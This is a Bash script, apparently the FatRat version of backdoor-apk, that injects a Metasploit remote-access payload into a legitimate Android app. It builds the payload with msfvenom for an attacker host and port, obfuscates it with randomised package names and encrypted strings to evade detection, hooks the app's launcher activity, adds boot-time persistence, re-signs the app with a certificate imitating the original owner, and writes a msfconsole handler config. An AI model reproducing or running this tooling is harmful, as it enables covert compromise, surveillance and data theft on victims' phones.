#!/bin/bash

#Recoded : peterpt & Edo maland 
#Author the tools : Dana James Traversie { dana-at-cp }
#fix some bug in the original script and compatible with fatrat : peterpt & screetsec
#apk-backdoor standalone file & original link https://github.com/dana-at-cp/backdoor-apk
#whatis backdoor apk 
#backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. 
#This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.


# Setting Colours
cyan='\e[0;36m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
RESET="\033[00m" #normal
path=`pwd`
MY_PATH=`pwd`
list="$path/config/listeners"
#setting tools variables
file="config/config.path"
if [ -f "$file" ]
then
MSFVENOM=`sed -n 15p $file`
DEX2JAR=`sed -n 13p $file`
UNZIP=`sed -n 6p $file`
KEYTOOL=`sed -n 7p $file`
JARSIGNER=`sed -n 5p $file`
APKTOOL=`sed -n 12p $file`
PROGUARD=`sed -n 9p $file`
DX=`sed -n 10p $file`
ZIPALIGN=`sed -n 8p $file`
ASO=tools/android-string-obfuscator/lib/aso
proconfig=config/android.pro
else
	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
exit 1
fi

apkconf="config/apk.tmp"
if [ -f "$apkconf" ]
then
ORIG_APK_FILE=`sed -n 1p $apkconf`
RAT_APK_FILE=`sed -n 2p $apkconf`
PAYLOAD=`sed -n 3p $apkconf`
LHOST=`sed -n 4p $apkconf`
LPORT=`sed -n 5p $apkconf`
else
	echo -e $red "APK Configuration file does not exist , run fatrat to config ."
exit 1
fi
# apt-get install lib32z1 lib32ncurses5 lib32stdc++6

VERSION="0.2.2"
LOG_FILE=$MY_PATH/logs/apk.log
TIME_OF_RUN=`date`

# functions
function find_smali_file {
  # $1 = smali_file_to_hook
  # $2 = android_class
  if [ ! -f $1 ]; then
    local index=2
    local max=1000
    local smali_file=""
    while [ $index -lt $max ]; do
      smali_file=$MY_PATH/temp/original/smali_classes$index/$2.smali
      if [ -f $smali_file ]; then
        # found
        FUNC_RESULT=$smali_file
        return 0
      else
        let index=index+1
      fi
    done
    # not found
    return 1
  else
    FUNC_RESULT=$1
    return 0
  fi
}

function hook_smali_file {
  # $1 = payload_tld
  # $2 = payload_primary_dir
  # $3 = payload_sub_dir
  # $4 = smali_file_to_hook
  local stop_hooking=0
  local smali_file=$4
  while [ $stop_hooking -eq 0 ]; do
    sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
    grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
    if [ $? == 0 ]; then
      echo -e $green ""
      echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
      FUNC_RESULT=$smali_file
      return 0
    else
      echo -e $red ""
      echo "Failed to hook smali file" >>$LOG_FILE 2>&1
      local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
      if [ -z $super_android_class ]; then
        let stop_hooking=stop_hooking+1
      else
        echo "Trying to hook super class: $super_android_class" >>$LOG_FILE 2>&1
        smali_file=$MY_PATH/temp/original/smali/$super_android_class.smali
        echo "New smali file to hook: $smali_file" >>$LOG_FILE 2>&1
        find_smali_file $smali_file $super_android_class
        if [ $? != 0 ]; then
          echo "Failed to find new smali file" >>$LOG_FILE 2>&1
          let stop_hooking=stop_hooking+1
        else
          echo "Found new smali file" >>$LOG_FILE 2>&1
        fi
      fi
    fi
  done
  return 1
}

function verify_orig_apk {
  if [ -z $MY_PATH/temp/$ORIG_APK_FILE ]; then
    echo -e $red ""
    echo "[!] No original APK file specified"
    exit 1
  fi

  if [ ! -f $MY_PATH/temp/$ORIG_APK_FILE ]; then
    echo -e $red ""
    echo "[!] Original APK file specified does not exist"
    exit 1
  fi

  $UNZIP -l $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo -e $red ""
    echo "[!] Original APK file specified is not valid"
    exit $rc
  fi
}

function consult_which {
  which $1 >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo -e $red ""
    echo "[!] Check your environment and configuration. Couldn't find: $1"
    exit $rc
  fi
}

function init {
  echo "Running Backdoor-apk 0.2.2 ( fatrat 1.9 Edition ) at $TIME_OF_RUN" >$LOG_FILE 2>&1
  consult_which $MSFVENOM
  consult_which $DEX2JAR
  consult_which $UNZIP
  consult_which $KEYTOOL
  consult_which $JARSIGNER
  consult_which $APKTOOL
  consult_which $PROGUARD
  consult_which $ASO
  consult_which $DX
  consult_which $ZIPALIGN
  verify_orig_apk
 }

# kick things off
init
echo -e $green ""
echo -ne "[*] Creating RAT Apk File..."
$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ] || [ ! -f $MY_PATH/temp/$RAT_APK_FILE ]; then
  echo -e $red "[!] Failed to generate RAT APK file"
  exit 1
fi
echo -e $green ""
echo -ne "[*] Decompiling RAT APK file..."
$APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to decompile RAT APK file"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Decompiling original APK file..."
$APKTOOL d -f -o $MY_PATH/temp/original $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to decompile original APK file"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Merging permissions of original and payload projects..."
# build random hex placeholder value without openssl
placeholder=''
for i in `seq 1 4`; do
  rand_num=`shuf -i 1-2147483647 -n 1`
  hex=`printf '%x' $rand_num`
  placeholder="$placeholder$hex"
done
echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
tmp_perms_file=$MY_PATH/temp/perms.tmp
original_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml
payload_manifest_file=$MY_PATH/temp/payload/AndroidManifest.xml
merged_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml.merged
grep "<uses-permission" $original_manifest_file >$tmp_perms_file
grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
grep "<uses-permission" $tmp_perms_file|sort|uniq >$tmp_perms_file.uniq
mv $tmp_perms_file.uniq $tmp_perms_file
sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
mv $merged_manifest_file.uniq $merged_manifest_file
sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
mv $merged_manifest_file $original_manifest_file
echo "done."

# cleanup payload directory after merging app permissions
#rm -rf $MY_PATH/temp/payload >>$LOG_FILE 2>&1

# use dex2jar, proguard, and dx
# to shrink, optimize, and obfuscate original Rat.apk code
echo -e $green ""
echo -ne "[*] Running proguard on RAT APK file..."
mkdir -v -p $MY_PATH/temp/bin/classes >>$LOG_FILE 2>&1
mkdir -v -p $MY_PATH/temp/libs >>$LOG_FILE 2>&1
mv $MY_PATH/temp/$RAT_APK_FILE $MY_PATH/temp/bin/classes >>$LOG_FILE 2>&1
$DEX2JAR $MY_PATH/temp/bin/classes/$RAT_APK_FILE -o $MY_PATH/temp/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo -e $red "[!] Failed to run dex2jar on RAT APK file"
  exit $rc
fi
# inject Java classes
cp -R $MY_PATH/java/classes/* $MY_PATH/temp/libs/ >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo -e $red "[!] Failed to inject Java classes"
  exit $rc
fi
cd $MY_PATH/temp/bin/classes 
jar xvf $MY_PATH/temp/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
cd $MY_PATH
rm $MY_PATH/temp/bin/classes/*.apk $MY_PATH/temp/bin/classes/*.jar >>$LOG_FILE 2>&1
$PROGUARD @$proconfig >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo -e $red "[!] Failed to run proguard with specified configuration"
  exit $rc
fi
$DX --dex --output="$MY_PATH/temp/$RAT_APK_FILE" $MY_PATH/temp/bin/classes-processed.jar >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo -e $red "[!] Failed to run dx on proguard processed jar file"
  exit $rc
fi
echo "done."
echo -e $green ""
echo -ne "[*] Decompiling obfuscated RAT APK file..."
$APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to decompile RAT APK file"
  exit $rc
fi

# avoid having com/metasploit/stage path to smali files
tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
echo "payload_tld is: $payload_tld" >>$LOG_FILE 2>&1
payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1
echo -e $green ""
echo -ne "[*] Creating new directories in original project for RAT smali files..."
mkdir -v -p $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to create new directories for RAT smali files"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Copying RAT smali files to new directories in original project..."
cp -v $MY_PATH/temp/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  cp -v $MY_PATH/temp/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/MainService.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  cp -v $MY_PATH/temp/payload/smali/net/dirtybox/util/*.smali $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to copy RAT smali files"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Fixing RAT smali files..."
sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{AppBoot.smali,MainService.smali} >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to fix RAT smali files"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Obfuscating const-string values in RAT smali files..."
cat >$MY_PATH/temp/obfuscate.method <<EOL

    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object ###REG###
EOL
stringobfuscator_class=`ls $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/temp/original/smali/::g" |sed "s:.smali::g"`
echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
so_key=$so_default_key
which openssl >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  so_key="$(openssl rand -base64 16)"
  rc=$?
fi
if [ $rc == 0 ]; then
  file="$MY_PATH/temp/original/smali/$stringobfuscator_class.smali"
  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
  else
    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
    so_key=$so_default_key
  fi
else
  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
  so_key=$so_default_key 
fi
echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
    file=`echo $line |awk -F ": " '{ print $1 }'`
    echo "File: $file" >>$LOG_FILE 2>&1
    target=`echo $line |awk -F ", " '{ print $2 }'`
    echo "Target: $target" >>$LOG_FILE 2>&1
    tmp=`echo $line |awk -F ": " '{ print $2 }'`
    reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
    echo "Reg: $reg" >>$LOG_FILE 2>&1
    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
    replacement=`$ASO e "$stripped_target" k "$so_key"`
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
      touch $MY_PATH/temp/obfuscate.error
      break
    fi
    replacement="\"$(echo $replacement)\""
    echo "Replacement: $replacement" >>$LOG_FILE 2>&1
    sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to replace target value" >>$LOG_FILE 2>&1
      touch $MY_PATH/temp/obfuscate.error
      break
    fi
    sed -i '\|'"$replacement"'|r '"$MY_PATH/temp"'/obfuscate.method' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
      touch $MY_PATH/temp/obfuscate.error
      break
    fi
    sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject register value" >>$LOG_FILE 2>&1
      touch $MY_PATH/temp/obfuscate.error
      break
    fi
  done
  if [ ! -f $MY_PATH/temp/obfuscate.error ]; then
    class="$stringobfuscator_class"
    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
    rc=$?
  else
    rm -v $MY_PATH/temp/obfuscate.error >>$LOG_FILE 2>&1
    rc=1
  fi
fi
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to obfuscate const-string values in RAT smali files"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Locating smali file to hook in original project..."
total_package=`head -n 2 $MY_PATH/temp/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/temp/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/temp/original/AndroidManifest.xml |grep -c "<activity"`
echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
# should get a value here if launcher line is within an activity-alias element
android_target_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/temp/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:targetActivity="[^\"]+"'|sed 's/\"//g'|sed 's/android:targetActivity=//g'|sed 's/\./\//g'`
echo "Value of android_target_activity: $android_target_activity" >>$LOG_FILE 2>&1
android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/temp/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
if [ -z $android_target_activity ]; then
  echo "The launcher line appears to be within an activity element" >>$LOG_FILE 2>&1
  tmp=$android_name
else
  echo "The launcher line appears to be within an activity-alias element" >>$LOG_FILE 2>&1
  tmp=$android_target_activity
fi
echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
# add package from manifest if needed
if [[ $tmp == /* ]]; then
  tmp=$total_package$tmp
fi
android_class=$tmp
echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
smali_file_to_hook=$MY_PATH/temp/original/smali/$android_class.smali
find_smali_file $smali_file_to_hook $android_class
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo -e $red "[!] Failed to locate smali file to hook"
  exit $rc
else
  echo "done."
  smali_file_to_hook=$FUNC_RESULT
  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
fi
echo -e $green ""
echo -ne "[*] Adding hook in original smali file..."
hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to add hook"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Adding persistence hook in original project..."
cat >$MY_PATH/temp/persistence.hook <<EOL
        <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
EOL
sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i '/'"$placeholder"'/r '"$MY_PATH/temp"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
    rc=$?
  fi
fi
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to add persistence hook"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Recompiling original project with backdoor..."
$APKTOOL b $MY_PATH/temp/original >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to recompile original project with backdoor"
  exit $rc
fi

keystore=$MY_PATH/temp/signing.keystore
compiled_apk=$MY_PATH/temp/original/dist/$ORIG_APK_FILE
unaligned_apk=$MY_PATH/temp/original/dist/unaligned.apk

dname=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $MY_PATH/temp/$ORIG_APK_FILE |grep -m 1 "Owner:" |sed 's/^.*: //g'`
echo "Original dname value: $dname" >>$LOG_FILE 2>&1

valid_from_line=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $MY_PATH/temp/$ORIG_APK_FILE |grep -m 1 "Valid from:"`
echo "Original valid from line: $valid_from_line" >>$LOG_FILE 2>&1
from_date=$(sed 's/^Valid from://g' <<< $valid_from_line |sed 's/until:.\+$//g' |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original from date: $from_date" >>$LOG_FILE 2>&1
from_date_tz=$(awk '{ print $5 }' <<< $from_date)
from_date_norm=$(sed 's/[[:space:]]'"$from_date_tz"'//g' <<< $from_date)
echo "Normalized from date: $from_date_norm" >>$LOG_FILE 2>&1
to_date=$(sed 's/^Valid from:.\+until://g' <<< $valid_from_line |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original to date: $to_date" >>$LOG_FILE 2>&1
to_date_tz=$(awk '{ print $5 }' <<< $to_date)
to_date_norm=$(sed 's/[[:space:]]'"$to_date_tz"'//g' <<< $to_date)
echo "Normalized to date: $to_date_norm" >>$LOG_FILE 2>&1
from_date_str=`TZ=UTC date --date="$from_date_norm" +"%Y/%m/%d %T"`
echo "Value of from_date_str: $from_date_str" >>$LOG_FILE 2>&1
end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
echo "Value of validity: $validity" >>$LOG_FILE 2>&1
echo -e $green ""
echo -ne "[*] Generating RSA key for signing..."
$KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "Retrying RSA key generation without original APK cert from date and validity values" >>$LOG_FILE 2>&1
  $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to generate RSA key"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Signing recompiled APK..."
$JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to sign recompiled APK"
  exit $rc
fi
echo -e $green ""
echo -ne "[*] Verifying signed artifacts..."
$JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to verify signed artifacts"
  exit $rc
fi

mv $compiled_apk $unaligned_apk
echo -e $green ""
echo -ne "[*] Aligning recompiled APK..."
$ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo -e $red "[!] Failed to align recompiled APK"
  exit $rc
fi

rm $unaligned_apk

#Checking finished apk file
fiapk=$MY_PATH/temp/original/dist/app.apk
if [ -f "$fiapk" ]
then
echo -e $green ""
echo -ne "[*] Backdoor apk created sucefully"
else
echo -e $red "There was a problem in the creation of your Rat apk file ,
check $MY_PATH/logs/apk.log for more information about the error ."
rm -rf temp/* > /dev/null 2>&1
exit 1
fi

#looking if already exists a previous backdoor apk created and renaming it
ren=`shuf -i 1-1000 -n 1`
back=$MY_PATH/backdoored/app_backdoor.apk
if [ -f "$back" ]
then
mv $MY_PATH/backdoored/app_backdoor.apk $MY_PATH/backdoored/app_backdoor_$ren.apk
echo -e $yellow ""
echo "FatRat Detected that you already had a previous created backdoor
file in ($MY_PATH/backdoored/) with the name app_backdoor.apk ."
echo -e $blue ""
echo "FatRat have renamed your old backdoor to app_backdoor$ren.apk"

#Moving finished backdoor file to final destination
mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
echo -e $green ""
echo "Your RAT apk was successfully builded and signed , it is located here :
 $MY_PATH/backdoored/app_backdoor.apk"
rm -rf temp/* > /dev/null 2>&1
echo ""
else
mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
echo -e $green ""
echo "Your RAT apk was successfully builded and signed , it is located here :
 $MY_PATH/backdoored/app_backdoor.apk"
rm -rf temp/* >/dev/null 2>&1
echo ""
fi
echo -e $okegreen "Do you want to create a listener for this configuration"
echo -e $okegreen "to use in msfconsole in future ?"
echo ""
echo -ne $cyan "Choose y/n : "
read sel
case $sel in
y|Y|Yes|yes|YES)
echo ""
echo -e $green "Write the name for this config . (ex : myratapk)"
echo -ne "Filename : ";tput sgr0
read fname
fl="$fname"
if [ -z $fname ]
then
svf="$path/config/listeners/myratapk.rc"
if [ -f $svf ]; then
svf="$path/config/listeners/myratapk$ren.rc"
touch $svf
payloads=`sed -n 3p $apkconf`
yourip=`sed -n 4p $apkconf`
yourport=`sed -n 5p $apkconf`
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payloads" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $green ""
echo "Configuration file saved to $list/myratapk$ren.rc"
else
svf="$path/config/listeners/myratapk.rc"
touch $svf
payloads=`sed -n 3p $apkconf`
yourip=`sed -n 4p $apkconf`
yourport=`sed -n 5p $apkconf`
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payloads" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $green ""
echo "Configuration file saved to $list/myratapk.rc"
fi
else
svf="$path/config/listeners/$fl.rc"
if [ -f $svf ]
then
svf="$path/config/listeners/$fl$ren.rc"
touch $svf 
payloads=`sed -n 3p $apkconf`
yourip=`sed -n 4p $apkconf`
yourport=`sed -n 5p $apkconf`
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payloads" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $blue ""
echo "Configuration file saved to $list/$fl$ren.rc"
else
svf="$path/config/listeners/$fl.rc"
touch $svf
payloads=`sed -n 3p $apkconf`
yourip=`sed -n 4p $apkconf`
yourport=`sed -n 5p $apkconf`
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payloads" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $blue ""
echo "Configuration file saved to $list/$fl.rc"
fi
fi
echo -e $green ""
exit
;;
n|no|No|NO)
echo -e $green ""
exit
;;
*)
echo -e $green ""
exit
;;
esac
